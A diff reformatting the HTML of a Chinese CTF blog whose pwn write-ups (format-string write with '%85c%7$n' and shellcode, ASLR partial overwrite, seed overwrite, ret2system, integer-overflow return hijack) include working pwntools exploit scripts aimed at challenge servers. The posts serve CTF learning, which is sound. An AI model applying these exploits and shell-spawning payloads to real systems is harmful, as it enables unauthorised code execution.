@@ -205,27 +205,23 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>在main()中<br>定义指针v3，malloc函数返回给v3一个地址（这里称作[0]），此时指针v3存放一个[0]，指向未知内容。<br>定义整型v5，将令v5=v3=[0]。<br>令v3指向68。<br>修改v3的下一个地址（这里称作[1]）为85。</p>
-<p>在sub_400D72(v5)中<br>参数传递int a1=v5</p>
-<p>在sub_400CA6(a1)中<br>参数传递新变量，指针a1（局部函数同名）存放a1，即存放[0]，指向68</p>
-<p>因为指针a1与指针v3存放同一个地址，所以a1就是v3，故<em><strong>a1</strong>=68，a1[1]=85。<br>题目要求使</em><strong>a1</strong>等于a1[1]，这里选择将*<strong>a1</strong>更改为85。</p>
-<h1 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h1><p>利用printf格式化字符串漏洞，算出修改地址[0]所需要的偏移量。再利用一遍，往[0]写入68。最后用shellcode拿到flag。</p>
-<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用于把其它的东西转换成整形</span></span><br><span class="line"><span class="comment">#class int(x, base=10)，base是声明x的进制的参数，默认为10</span></span><br><span class="line">var1=<span class="built_in">int</span>(<span class="built_in">str</span>,<span class="number">16</span>) <span class="comment">#字符串只能是16进制</span></span><br><span class="line">var2=<span class="built_in">int</span>(<span class="built_in">str</span>[<span class="number">0</span>:n],<span class="number">16</span>) <span class="comment">#把str字符串第0位到n-1位的10进制存入var2</span></span><br><span class="line">var3=<span class="built_in">int</span>(<span class="built_in">str</span>[:-<span class="number">1</span>],<span class="number">16</span>) <span class="comment">#选中除了最后一位的所有字符串</span></span><br><span class="line"><span class="comment">#对于不在16进制内的字符，会产生编译错误（\n 例外，这个直接忽略）</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="格式化字符串漏洞利用具体"><a href="#格式化字符串漏洞利用具体" class="headerlink" title="格式化字符串漏洞利用具体"></a>格式化字符串漏洞利用具体</h1><p>脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">39003</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">s0=io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">v3_addr=<span class="built_in">int</span>(s0[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>,<span class="string">&quot;yy&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>,<span class="string">&quot;east&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me an address&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;And, you wish is:&quot;</span>,<span class="string">&quot;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;I hear it, I hear it....&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
+          <h1 id="分析">分析</h1>
+<p>在main()中 定义指针v3，malloc函数返回给v3一个地址（这里称作[0]），此时指针v3存放一个[0]，指向未知内容。 定义整型v5，将令v5=v3=[0]。 令v3指向68。 修改v3的下一个地址（这里称作[1]）为85。</p>
+<p>在sub_400D72(v5)中 参数传递int a1=v5</p>
+<p>在sub_400CA6(a1)中 参数传递新变量，指针a1（局部函数同名）存放a1，即存放[0]，指向68</p>
+<p>因为指针a1与指针v3存放同一个地址，所以a1就是v3，故<em><strong>a1</strong>=68，a1[1]=85。 题目要求使</em><strong>a1</strong>等于a1[1]，这里选择将*<strong>a1</strong>更改为85。</p>
+<h1 id="主要思路">主要思路</h1>
+<p>利用printf格式化字符串漏洞，算出修改地址[0]所需要的偏移量。再利用一遍，往[0]写入68。最后用shellcode拿到flag。</p>
+<h1 id="补充">补充</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用于把其它的东西转换成整形</span></span><br><span class="line"><span class="comment">#class int(x, base=10)，base是声明x的进制的参数，默认为10</span></span><br><span class="line">var1=<span class="built_in">int</span>(<span class="built_in">str</span>,<span class="number">16</span>) <span class="comment">#字符串只能是16进制</span></span><br><span class="line">var2=<span class="built_in">int</span>(<span class="built_in">str</span>[<span class="number">0</span>:n],<span class="number">16</span>) <span class="comment">#把str字符串第0位到n-1位的10进制存入var2</span></span><br><span class="line">var3=<span class="built_in">int</span>(<span class="built_in">str</span>[:-<span class="number">1</span>],<span class="number">16</span>) <span class="comment">#选中除了最后一位的所有字符串</span></span><br><span class="line"><span class="comment">#对于不在16进制内的字符，会产生编译错误（\n 例外，这个直接忽略）</span></span><br></pre></td></tr></table></figure>
+<h1 id="格式化字符串漏洞利用具体">格式化字符串漏洞利用具体</h1>
+<p>脚本 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">39003</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">s0=io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">v3_addr=<span class="built_in">int</span>(s0[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>,<span class="string">&quot;yy&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>,<span class="string">&quot;east&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me an address&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;And, you wish is:&quot;</span>,<span class="string">&quot;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;I hear it, I hear it....&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
 <img src="/2021/03/25/AD-string/1.png" class>
-<p>v2的地址和format的地址很近，format写入AAAA，v2写入1<br>泄露出format、v2的地址，算偏移。</p>
-<p>得知v2为栈内第7个元素，format为第8个，printf函数进栈顺序在CGfsb里有详情。</p>
-<img src="/2021/03/25/AD-string/3.png" class>
-
+<p>v2的地址和format的地址很近，format写入AAAA，v2写入1 泄露出format、v2的地址，算偏移。</p>
+<p>得知v2为栈内第7个元素，format为第8个，printf函数进栈顺序在CGfsb里有详情。 <img src="/2021/03/25/AD-string/3.png" class></p>
 <p>接下来再次攻击时，往v2写入我们想要的地址，注意v2的变量是整形，同时send只能发送字符串。所以将想要写入的地址v3_add即[0]，但v3_add已经在之前就被转为整形，这里只要将它当初字符串发送即可。</p>
-<p>printf(“%85c%7$n”)会想偏移第7处，所存的地址指向的地址出，写入85（%85c相当于85个字符）。（详情见CGfsb）</p>
+<p>printf("%85c%7$n")会想偏移第7处，所存的地址指向的地址出，写入85（%85c相当于85个字符）。（详情见CGfsb）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">47546</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">s0=io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">v3_addr=<span class="built_in">int</span>(s0[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>,<span class="string">&quot;yy&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>,<span class="string">&quot;east&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me an address&quot;</span>,<span class="built_in">str</span>(v3_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;And, you wish is:&quot;</span>,<span class="string">&quot;%85c%7$n&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;USE YOU SPELL&quot;</span>, shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>PS: shellcode的相关内容有在“pwn用到的工具汇总中更新，持续更新中”。</p>
 
       
@@ -299,19 +295,16 @@
     <div class="post-body" itemprop="articleBody">
           <p>程序开启了随机地址保护——<strong>但随机地址不包括低三位的地址</strong></p>
 <img src="/2021/03/24/Nep-1/3.png" class>
-
 <img src="/2021/03/24/Nep-1/2.png" class>
-
 <p>v4用于接收我们的输入数据，能存放8个字节</p>
 <p>sub_10D0猜测是read函数，因为语法还有对应的汇编代码极其相似</p>
 <p>所以输入8个字节的数据覆盖v4，在输入8个字节覆盖 保存的ebp（因为程序是64位，所以ebp为8个字节），接下来就可以返回地址覆盖上所需跳转的地址。</p>
 <img src="/2021/03/24/Nep-1/1.png" class>
-
 <p>这里是想要跳转到底地址，可以输出flag的函数。</p>
 <p>但程序开启了ASLR，除了低3位的地址以外其余全是扯淡，所以记录下这个函数的开头的第三位地址，但整个程序的的地址也才4位，所以可以随机选一个第四位地址，多次打击，欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉，1/16的概率能打中。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">36058</span>)</span><br><span class="line">	io.send(<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+p16(<span class="number">0x64e1</span>))</span><br><span class="line">	res = io.recvall()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>p64()—-8个字节<br>p32()—-4个字节<br>p16()—-2个字节</p>
+<p>p64()----8个字节 p32()----4个字节<br>
+p16()----2个字节</p>
 <p>为什么要用p16()不知道，猜测和程序的栈溢出保护有关。</p>
 
       
@@ -384,21 +377,17 @@
     
     <div class="post-body" itemprop="articleBody">
           <img src="/2021/03/16/AD-guess-num/1.png" class>
-
 <p>可以看出要进行10次猜测，保证每次猜测（v4）与v6相等，即可执行sub_C3E，sub_C3E是能得到的flag函数。</p>
 <p>v6来自伪随机函数rand()</p>
 <p>rand()需要srand()提供的种子，只要种子相同，rand()就一定相同。</p>
 <p>此处种子为seed</p>
 <img src="/2021/03/16/AD-guess-num/2.png" class>
-<p>该图中地址为ida地址，1代表1个字节</p>
-<img src="/2021/03/16/AD-guess-num/1.jpg" class>
-
+<p>该图中地址为ida地址，1代表1个字节 <img src="/2021/03/16/AD-guess-num/1.jpg" class></p>
 <p>该程序用gets来读取&amp;v7（name）（），所以可以用名字覆盖种子（写入我们需要的种子），再另外写一个cpp程序来看看该种子对应的rand（）函数值。</p>
 <p><strong>ida地址表示1相当于1个字节</strong></p>
 <p>名字写入0x24个a，相当于从客户端·输入32个a，一个a一个字节，刚好覆盖完-30h到-10h的地址，触及seed的地址，seed的类型是unsigned int，故seed[0]的大小为4个字节，故选取的种子4个a。</p>
 <p>这里特别要注意，由于题目本身是在linux下的，所以我们自己写的程序也要在linux下进行测试，不同的平台所产生的结果是不同的（我吐了，卡了老子这久）</p>
 <img src="/2021/03/16/AD-guess-num/2.jpg" class>
-
 <p><em>顺便需要学习在Linux中编写c</em></p>
 <p><em>首先确保安装了gcc，g++。我的linux里已经有了</em></p>
 <p><em>新建文件夹命名为xxx.cpp或xxx.c</em></p>
@@ -409,10 +398,9 @@
 <p>回到这题</p>
 <p>附件只提供参考，flag不在附件中，如果单纯运行附件答题能成功，但给不出flag（怎么想怎么对，我之前竟然不知道）</p>
 <p>所以有两个方法完成这题</p>
-<p>第一种方法nc服务器，输入0x24个a，也就是36个a，答题，得到flag </p>
+<p>第一种方法nc服务器，输入0x24个a，也就是36个a，答题，得到flag</p>
 <p>第二种方法是使用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47746</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">ans=[<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">	io.recvuntil(<span class="string">&quot;Please input your guess number:&quot;</span>)</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
@@ -486,12 +474,13 @@
           <p>庆祝第一次自己找到漏洞</p>
 <img src="/2021/03/14/AD-level2/1.png" class>
 <p>buf的大小为0x88，但却能读入0x100，造成了溢出</p>
-<p>​    <img src="/2021/03/14/AD-level2/2.png" class><br>​    敏感函数system的地址：0x08048320<br>​    <code>_system</code>函数里面有system(command)</p>
+<p>​ <img src="/2021/03/14/AD-level2/2.png" class> ​ 敏感函数system的地址：0x08048320 ​ <code>_system</code>函数里面有system(command)</p>
 <img src="/2021/03/14/AD-level2/3.png" class>
 <p>关键字符串的地址：0x0804A024</p>
-<p>在32位程序运行中，函数参数直接压入栈中。<br>调用函数时栈的结构为：1调用<strong>函数地址</strong>，2调用<strong>函数返回地址</strong>，参数n，参数n-1，参数。。。</p>
-<p>用0x88个字符覆盖栈，在用0x04个字符覆盖ebp的地址，将返回地址覆写为system函数。<br>根据调用函数时栈的结构，system函数需要返回地址，故写入0x04个字符作为虚假的返回地址（不起作用），在写入bin_sh命令作为system的参数。<br>关键在于，弄清system函数的底层结构。</p>
+<p>在32位程序运行中，函数参数直接压入栈中。 调用函数时栈的结构为：1调用<strong>函数地址</strong>，2调用<strong>函数返回地址</strong>，参数n，参数n-1，参数。。。</p>
+<p>用0x88个字符覆盖栈，在用0x04个字符覆盖ebp的地址，将返回地址覆写为system函数。 根据调用函数时栈的结构，system函数需要返回地址，故写入0x04个字符作为虚假的返回地址（不起作用），在写入bin_sh命令作为system的参数。 关键在于，弄清system函数的底层结构。</p>
 <img src="/2021/03/14/AD-level2/1.jpg" class>
+
       
     </div>
 
@@ -561,57 +550,57 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="溢出距离"><a href="#溢出距离" class="headerlink" title="溢出距离"></a>溢出距离</h2><table>
+          <h2 id="溢出距离">溢出距离</h2>
+<table>
 <thead>
-<tr>
-<th align="center">类型</th>
-<th align="center">占用字节数</th>
-<th align="center">取值范围</th>
+<tr class="header">
+<th style="text-align: center;">类型</th>
+<th style="text-align: center;">占用字节数</th>
+<th style="text-align: center;">取值范围</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">int</td>
-<td align="center">4</td>
-<td align="center">-2147483648~2147483647</td>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">int</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">-2147483648~2147483647</td>
 </tr>
-<tr>
-<td align="center">short int</td>
-<td align="center">2</td>
-<td align="center">-32768~32767</td>
+<tr class="even">
+<td style="text-align: center;">short int</td>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">-32768~32767</td>
 </tr>
-<tr>
-<td align="center">unsigned int</td>
-<td align="center">4</td>
-<td align="center">0~4294967295</td>
+<tr class="odd">
+<td style="text-align: center;">unsigned int</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">0~4294967295</td>
 </tr>
-<tr>
-<td align="center">unsigned short int</td>
-<td align="center">2</td>
-<td align="center">0~65535</td>
+<tr class="even">
+<td style="text-align: center;">unsigned short int</td>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">0~65535</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>65535D=0000 <strong>1111 1111 1111 1111</strong>B</p>
 <p>65536D=0001 <strong>0000 0000 0000 0000</strong>B</p>
 <p>65537D=0001 <strong>0000 0000 0000 0001</strong>B</p>
 <p>在一个unsigned short int 类型的变量中，由于溢出部分直接忽略（加粗部分为有效值），故65536D=0D，65537D=1D</p>
-<h2 id="题目中的溢出"><a href="#题目中的溢出" class="headerlink" title="题目中的溢出"></a>题目中的溢出</h2><img src="/2021/03/10/AD-int-overflow/1.png" class>
-
+<h2 id="题目中的溢出">题目中的溢出</h2>
+<img src="/2021/03/10/AD-int-overflow/1.png" class>
 <p>得出&amp;buf能存储409个字符</p>
 <img src="/2021/03/10/AD-int-overflow/2.png" class>
-
 <p>&amp;buf的参数传递给s</p>
 <p>v3用于存储s的长度</p>
 <p>unsigned _ int8 v3;代表v3的大小为8位，即能存储的数字范围为0到255，256相当于0，257相当于1。</p>
 <p>也就是说，如果s字符串的长度在259到264之间，也能通过if。</p>
-<h2 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h2><img src="/2021/03/10/AD-int-overflow/3.png" class>
-
+<h2 id="覆盖">覆盖</h2>
+<img src="/2021/03/10/AD-int-overflow/3.png" class>
 <img src="/2021/03/10/AD-int-overflow/4.png" class>
-
 <p>这里涉及字符串拷贝，拷贝的目的地在栈中，栈长度为14h+4h</p>
 <p>只要通过溢出覆盖check-passwd函数的返回地址，返回到what is this函数去执行里面的代码，就可以得到我们需要的flag</p>
-<p>第一步<br>4h+4h=20D+4D=24 覆盖掉用于拷贝的栈24个字节<br>第二步<br>跳转到what is this的地址 p32（0x0804868B）<br>p32大小为4个字节，至此已输入了28个字节<br>第三步<br>补充字节直到密码长度为259到264之间</p>
+<p>第一步 4h+4h=20D+4D=24 覆盖掉用于拷贝的栈24个字节 第二步 跳转到what is this的地址 p32（0x0804868B） p32大小为4个字节，至此已输入了28个字节 第三步 补充字节直到密码长度为259到264之间</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47792</span>)</span><br><span class="line">flag = <span class="number">0x0804868B</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;your father&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">24</span> + p32(flag) + <span class="string">&quot;a&quot;</span>*<span class="number">232</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>完结撒花</p>
 
       
@@ -684,95 +673,91 @@
     
     <div class="post-body" itemprop="articleBody">
           <img src="/2020/12/31/AD-CGfsb/1.png" class>
-
-<p>得到信息：<br>32位程序<br>Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh\x00获得shell<br>开启了栈溢出保护<br>PIE未开启，在编译时将程序编译为位置相关，程序运行时各个段（如代码但等）加载的虚拟地址确定</p>
+<p>得到信息： 32位程序 Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh00获得shell 开启了栈溢出保护 PIE未开启，在编译时将程序编译为位置相关，程序运行时各个段（如代码但等）加载的虚拟地址确定</p>
 <p><strong>printf与%n</strong></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;01234568789%n&quot;</span>,b); <span class="comment">//%n将之前输出的字符个数存入b，同时不输出字符串</span></span><br></pre></td></tr></table></figure>
-<p>%n前面写了10个字符，所以向ESP（栈顶指针）所指向的地址处所指向的地址处（ESP指向了栈顶，此处存储着一个地址）写入10。<br>%10$n，与%n类似，不过是向[ESP + 10]处指向的内存处写入7。</p>
+<p>%n前面写了10个字符，所以向ESP（栈顶指针）所指向的地址处所指向的地址处（ESP指向了栈顶，此处存储着一个地址）写入10。 %10$n，与%n类似，不过是向[ESP + 10]处指向的内存处写入7。</p>
 <p><strong>关于fgets</strong></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a;</span><br><span class="line"><span class="built_in">fgets</span>(a,<span class="number">10</span>,stdin);<span class="comment">//从键盘输入中获取数据，当读取 (10-1) 个字符时，或者读取到换行符时停止</span></span><br><span class="line"><span class="comment">//如果成功，该函数返回相同的 a 参数。</span></span><br><span class="line"><span class="comment">//如果到达文件末尾或者没有读取到任何字符，a 的内容保持不变，并返回一个空指针。如果发生错误，返回一个空指针。</span></span><br><span class="line">fp = <span class="built_in">fopen</span>(<span class="string">&quot;file.txt&quot;</span> , <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp == <span class="literal">NULL</span>) &#123;<span class="built_in">perror</span>(<span class="string">&quot;打开文件时发生错误&quot;</span>);<span class="keyword">return</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">fgets</span> (str, <span class="number">60</span>, fp)!=<span class="literal">NULL</span> ) &#123;...&#125;<span class="comment">//从文件中获取数据</span></span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="built_in">fgets</span>(&amp;c,<span class="number">100</span>,stdin);<span class="comment">//改写c的地址</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
 <p><strong>堆栈中的printf函数</strong></p>
-<p>printf(“format”,输出表列)<br>format意思是格式化字符串</p>
+<p>printf("format",输出表列) format意思是格式化字符串</p>
 <p>printf函数右序进栈</p>
-<p>printf 函数有一个 bug 就是当 format 字符串中所需要替换的参数数量，多于提供的参数数量，就会产生任意地址读漏洞。<br>例如，printf(“abcde%X %p %x %x”, a, b, c)这句命令中，format 需要 4 个参数，我们只提供了 3 个，所以 printf就会在栈上延续读取数据作为其参数。<br>如下所示，位于栈上的数据“我是你爹”由于挨着参数 3，在 printf 函数需要的参数不够时，被认作为 printf所缺的参数读取了</p>
+<p>printf 函数有一个 bug 就是当 format 字符串中所需要替换的参数数量，多于提供的参数数量，就会产生任意地址读漏洞。 例如，printf(“abcde%X %p %x %x”, a, b, c)这句命令中，format 需要 4 个参数，我们只提供了 3 个，所以 printf就会在栈上延续读取数据作为其参数。 如下所示，位于栈上的数据“我是你爹”由于挨着参数 3，在 printf 函数需要的参数不够时，被认作为 printf所缺的参数读取了</p>
 <table>
 <thead>
-<tr>
-<th align="center">地址</th>
-<th align="center">栈</th>
-<th align="center">内容</th>
+<tr class="header">
+<th style="text-align: center;">地址</th>
+<th style="text-align: center;">栈</th>
+<th style="text-align: center;">内容</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">高地址</td>
-<td align="center">返回地址</td>
-<td align="center">不晓得</td>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">高地址</td>
+<td style="text-align: center;">返回地址</td>
+<td style="text-align: center;">不晓得</td>
 </tr>
-<tr>
-<td align="center"></td>
-<td align="center">EBP</td>
-<td align="center">某个指针，不晓得</td>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">EBP</td>
+<td style="text-align: center;">某个指针，不晓得</td>
 </tr>
-<tr>
-<td align="center"></td>
-<td align="center">main函数局部变量</td>
-<td align="center">保存用</td>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">main函数局部变量</td>
+<td style="text-align: center;">保存用</td>
 </tr>
-<tr>
-<td align="center">0x12</td>
-<td align="center">format字符串</td>
-<td align="center">abcde%X %p %x %x</td>
+<tr class="even">
+<td style="text-align: center;">0x12</td>
